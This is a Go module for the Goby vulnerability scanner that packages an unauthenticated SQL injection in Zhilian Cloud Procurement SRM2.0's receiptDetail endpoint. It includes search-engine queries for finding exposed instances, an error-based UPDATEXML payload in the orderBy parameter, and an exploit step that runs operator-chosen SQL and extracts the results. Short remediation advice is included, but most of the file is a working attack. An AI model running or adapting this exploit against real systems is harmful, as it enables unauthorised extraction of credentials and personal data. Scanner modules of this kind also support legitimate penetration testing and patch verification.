package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zhilian Cloud Procurement SRM2.0 /adpweb/api/srm/delivery/receiptDetail SQL Injection Vulnerability",
    "Description": "<p>Zhilian Cloud Procurement SRM2.0 is a product designed to address enterprise supply chain procurement management challenges and digital transformation needs. Leveraging cutting-edge technologies such as AI, IoT, big data, and cloud, it helps enterprises achieve more predictive strategic sourcing, more forward-looking supplier management, and more automated procurement execution. The receiptDetail interface of this product has a SQL injection vulnerability, allowing unauthenticated attackers to obtain sensitive information such as usernames and passwords.</p>",
    "Product": "Zhilian Cloud Procurement SRM2.0",
    "Homepage": "https://www.zhilink.com/",
    "DisclosureDate": "2024-11-21",
    "PostTime": "2024-11-28",
    "Author": "1251220046@qq.com",
    "FofaQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "GobyQuery": "(body=\"function changeTableMode()\" || title==\"SRM 2.0\") && header=\"Content-Type: text/html\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, user personal information), and can even write Trojans into the server with high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. It is recommended to pay attention to the manufacturer's information and update to the latest version in time; <a href=\"http://www.zhilink.com\">www.zhilink.com</a></p><p>2. Deploy a Web application firewall to monitor database operations;</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143933156?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "version(),user(),database()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "user()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/adpweb/api/srm/delivery/receiptDetail?orderBy={{{urlencode_poc}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{random_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/adpweb/api/srm/delivery/receiptDetail?orderBy={{{urlencode_exp}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|syntax error: '([^'\"]+)'",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "智联云采 SRM2.0 /adpweb/api/srm/delivery/receiptDetail SQL 注入漏洞",
            "Product": "智联云采 SRM2.0",
            "Description": "<p>智联云采 SRM2.0 是一款针对企业供应链采购管理难题及数字化转型需求的产品。该产品依托人工智能、物联网、大数据、云等前沿技术，帮助企业实现更具预测性的战略寻源、更具前瞻性的供应商管理和更具自动性的采购执行。该产品的 receiptDetail 接口存在 SQL 注入漏洞，未经身份认证的攻击者可获取用户名、密码等敏感信息。</p>",
            "Recommendation": "<p>1. 建议关注厂商信息，及时更新到最新版本；<a href=\"http://www.zhilink.com\">www.zhilink.com</a></p><p>2. 部署 Web 应用防火墙，对数据库操作进行监控；</p><p>3. 如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、用户个人信息），甚至在高权限的情况下可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zhilian Cloud Procurement SRM2.0 /adpweb/api/srm/delivery/receiptDetail SQL Injection Vulnerability",
            "Product": "Zhilian Cloud Procurement SRM2.0",
            "Description": "<p>Zhilian Cloud Procurement SRM2.0 is a product designed to address enterprise supply chain procurement management challenges and digital transformation needs. Leveraging cutting-edge technologies such as AI, IoT, big data, and cloud, it helps enterprises achieve more predictive strategic sourcing, more forward-looking supplier management, and more automated procurement execution. The receiptDetail interface of this product has a SQL injection vulnerability, allowing unauthenticated attackers to obtain sensitive information such as usernames and passwords.</p>",
            "Recommendation": "<p>1. It is recommended to pay attention to the manufacturer's information and update to the latest version in time; <a href=\"http://www.zhilink.com\">www.zhilink.com</a></p><p>2. Deploy a Web application firewall to monitor database operations;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can exploit SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, user personal information), and can even write Trojans into the server with high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "random_int": "define|variable|{{{rand|int|8}}}",
        "random_md5": "define|md5|{{{random_int}}}",
        "poc": "define|variable|MD5({{{random_int}}})",
        "urlencode_poc": "define|url_encode|(UPDATEXML(8058,CONCAT(0x2e,(SELECT {{{poc}}})),3521))",
        "payload": "switch|attackType|{{{default}}}",
        "exp": "define|variable|(UPDATEXML(8058,CONCAT(0x2e,(SELECT {{{payload}}})),3521))",
        "urlencode_exp": "define|url_encode|{{{exp}}}"
    },
    "EditType": "fast",
    "VariablesOrder": [
        "random_int",
        "random_md5",
        "poc",
        "urlencode_poc",
        "payload",
        "exp",
        "urlencode_exp"
    ],
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
